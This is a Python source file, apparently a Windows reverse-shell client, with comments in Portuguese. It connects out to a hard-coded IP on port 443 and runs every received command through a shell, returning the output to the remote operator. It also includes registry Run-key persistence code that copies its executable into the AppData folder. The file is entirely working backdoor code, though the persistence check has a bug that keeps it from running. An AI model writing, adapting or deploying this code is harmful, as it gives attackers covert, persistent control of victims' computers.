import draw
import socket
from time import sleep
import subprocess
import os
import sys
import shutil
import winreg

# %APPDATA%\Microsoft\Windows
# Software\Microsoft\CurrentVersion\Run

IP = '192.168.1.78'
PORT = 443
PROGRAM_NAME = "fkz404" 

# Editor de registro, colocar a pasta que é executada quando o Windows liga.
REGISTRY_KEY_PATH = ""

def copy_to_system():
    try:
        appdata_path = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows')

        if not os.path.exists(appdata_path):
            os.makedirs(appdata_path)
        
        current_file = sys.executable
        destination = os.path.join(appdata_path, f'{PROGRAM_NAME}.exe')

        # Verifica se o arquivo atual não esta na pasta de destino
        # ou seja ainda não foi copiado.
        if os.path.abspath(current_file) != os.path.abspath(destination):
            shutil.copy2(current_file, destination)
            return destination
        else:
            return current_file

    except Exception as e:
        print(f'[!] Error copying file {e}')
        return sys.executable
    
def add_to_registry(file_path):
    if  not REGISTRY_KEY_PATH:
        return False

    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            REGISTRY_KEY_PATH,
            0,
            winreg.KEY_SET_VALUE
        )

        winreg.SetValueEx(
            key,
            PROGRAM_NAME,
            0,
            winreg.REG_SZ,
            file_path
        )
    
        winreg.CloseKey(key)
        return True

    except Exception as e:
        return False

def check_persistence():
    try:
        key = winreg.OpenKey(
             winreg.HKEY_CURRENT_USER,
            REGISTRY_KEY_PATH,
            0,
            winreg.KEY_READ
        )

        # Procura pelo programa no registro do windows
        value, _ = winreg.QueryValueEx(key, PROGRAM_NAME)
        winreg.CloseKey(key)
        return True
    
    except FileNotFoundError:
        return False

    except Exception as e:
        print(f'[-] Error checking persistence {e}')
        return False


def setup_persistence():
    try:
        if check_persistence:
            return

        persistence_path = copy_to_system()
        add_to_registry(persistence_path)
    
    except Exception as e:
        print(f'[-] Persistence setup failed {e}')

def connect(ip, port):
    try:
        c = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c.connect((ip, port))
        c.send(b"[+] Client Connected\n")

        return c
    except Exception as e:  
        print(f'[!] Connection Error {e}')

def listen(c):
    try:
        while True:
            data = c.recv(1024).decode().strip()
            if data == '/exit':
                return
            else:
                cmd(c, data) 
    except Exception as e:
        print(f'[!] Listen function error:  {e}')
        
def cmd(c, command):
    try:
        if command.startswith("cd "):
            try:
                os.chdir(command[3:].strip())
                c.send(b"[+] Directory changed successfully\n")
            except:
                c.send(b"[-] Failed to change directory\n")
            return
        
        if command == "/check_persistence":
            if check_persistence():
                c.send(f"[i] Persistence Status:\n\t [-] Path: {sys.executable}\n\t [-] Registry Key : {REGISTRY_KEY_PATH}\n\t [-] Name: {PROGRAM_NAME}".encode())
                return
            else:
                c.send(f"[i] Persistence Status:\n\t [-] Status: FAIL")
                return
        
        if command == "/setup_persistence":
            setup_persistence()
        
        p = subprocess.Popen(
            command,
            shell=True,
            stdin=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdout=subprocess.PIPE
        )
        
        output = p.stdout.read() + p.stderr.read()
        if not output:
            output = b"[+] Command executed successfully\n"
            print(f"[>] {output.decode()}")
        c.send(output)
        
    except Exception as e:
        error_msg = f"[-] Command error: {str(e)}\n".encode()
        print(f"[!] {error_msg.decode()}")

if __name__ == '__main__':  

    print(draw())

    print(f"[i] Starting client, connecting to {IP}:{PORT}")
    try:
        setup_persistence()

        while True:
            client = connect(IP, PORT)
            if client:
                print("[+] Connected successfully!")
                listen(client)
                client.close()
                print("[~] Connection closed, retrying...")
            sleep(5)
            
    except KeyboardInterrupt:
        print("[^] Program interrupted by user")
    except Exception as e:
        print(f"[!] Main connection error: {e}")